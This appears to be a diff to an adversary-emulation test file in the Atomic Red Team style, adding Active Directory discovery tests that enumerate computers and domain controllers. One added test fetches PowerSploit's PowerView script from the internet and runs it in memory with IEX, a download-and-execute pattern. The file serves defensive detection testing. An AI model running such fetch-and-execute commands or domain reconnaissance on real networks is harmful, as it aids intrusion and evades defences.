@@ -310,6 +310,18 @@ atomic_tests:
         Write-Host $Computer}
     name: powershell
     elevation_required: false
+- name: Enumerate Active Directory Computers with Get-AdComputer
+  description: |
+    The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.
+    Upon successful execution a listing of Computers will output with their paths in AD.
+    Reference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Get-AdComputer -Filter *
 - name: Enumerate Active Directory Computers with ADSISearcher
   auto_generated_guid: 64ede6ac-b57a-41c2-a7d1-32c6cd35397d
   description: |
@@ -323,3 +335,25 @@ atomic_tests:
     elevation_required: false
     command: |
       ([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
+- name: Get-DomainController with PowerView
+  description: |
+    Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
+    name: powershell
+- name: Get-wmiobject to Enumerate Domain Controllers
+  description: |
+    The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.
+    Upon successful execution a listing of Systems from AD will output with their paths.
+    Reference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      get-wmiobject -class ds_computer -namespace root\directory\ldap
